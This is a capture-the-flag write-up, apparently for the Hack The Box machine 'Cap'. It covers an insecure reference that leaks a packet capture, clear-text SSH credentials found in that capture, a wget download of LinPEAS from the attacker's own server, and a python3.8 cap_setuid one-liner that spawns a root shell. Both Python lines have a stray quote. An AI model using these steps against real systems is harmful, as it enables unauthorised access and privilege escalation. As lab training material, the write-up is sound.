## Enumeration

Nmap as always, gives 3 ports open : SSH, FTP , HTTP.

Before checking what's hosted on port 80, I'll try getting what's available on the ftp server and download it on my machine using this command:

```shell-session
$ wget -m --no-passive ftp://annonymous:annonymous@cap.htb
```

Which resulted in nothing. So we move on. Here's what we found on port 80

Poking around a bit, letting out nmap and ffuf going on the background we found out that network status is showing us the incoming network traffic to the server:

Nothing interesting for now, same goes for the IP config panel.

Meanwhile, Ffuf and nmap scripts didn't give us much to exploit.

So looking at the Security snapshot panel which redirected us to /data/7:

Trying some path traversal didn't work because there's input sanitization.

So upon trying to access another data then the 7th IT WORKED! and intuitively we went to `/data/0` and download the `.pcap` file.

## User flag

Looking around the protocols  we found clear-text credentials for the user nathan which connected us successfully through ssh:

## Priv esc

The sudo -l command can't be used since we don't have the perms so to enumerate further i downloaded LinPEAS.sh from my custom python http server:

```shell-session
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then downloaded it with a simple wget command:

```shell-session
$ wget http://10.10.14.60:8000/linPEAS.sh
```

{% hint style="danger" %}
You must put the file you want to download in the same directory from where you launched the python http server to be able to access it.
{% endhint %}

Upon enumeration, we got an interesting file with interesting capabilities:

Diving into cap\_setuid here's what it does:

In Linux, the CAP\_SETUID and CAP\_SETGID capabilities allow a process to change its UID and GID, respectively, providing control over user and group identity management. Attackers may leverage a misconfiguration for exploitation in order to escalate their privileges to root.

So we need a python script that changes the uid to 0 (root) and simply pop a shell. Here's one:

```python
import os; os.setuid(0); os.system("/bin/bash")'
```

```shell-session
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")''
```

{% hint style="success" %}
And we succesfully got the flag!
